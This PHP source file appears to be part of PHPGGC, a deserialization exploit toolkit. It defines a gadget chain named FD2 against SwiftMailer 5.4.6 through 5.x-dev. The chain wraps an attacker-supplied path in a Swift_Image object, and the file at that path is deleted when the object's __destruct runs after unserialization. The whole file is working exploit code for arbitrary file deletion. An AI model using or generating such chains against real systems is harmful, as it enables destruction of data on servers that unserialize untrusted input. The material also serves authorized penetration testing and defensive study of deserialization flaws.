<?php

namespace GadgetChain\SwiftMailer;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '5.4.6 <= 5.x-dev';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'the path should be in the form of "path/filename"';

    public function generate(array $parameters)
    {
        return new \Swift_Image($parameters['remote_path']);
    }
}
